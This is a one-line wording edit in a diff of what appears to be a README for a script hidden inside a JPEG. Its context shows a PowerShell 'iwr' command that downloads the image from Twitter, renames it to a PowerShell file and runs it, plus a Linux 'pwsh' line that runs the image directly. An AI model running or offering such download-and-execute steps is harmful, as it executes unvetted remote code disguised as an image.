@@ -47,7 +47,7 @@ iwr "https://pbs.twimg.com/media/F6KdhMtX0AAhSQf?format=jpg&name=small" -OutFile
 ````
 The command will download the image from ***Twitter***, rename the image file to give it a ***PowerShell*** extension, then execute the script.
 
-To start the script using ***Linux***, just enter this command within a terminal. There is no need to change the file extension with ***Linux***. 
+To start the script using ***Linux***, just enter the following command within a terminal. There is no need to change the file extension with ***Linux***. 
 
 ````bash
 *$ pwsh jpws_img.jpg
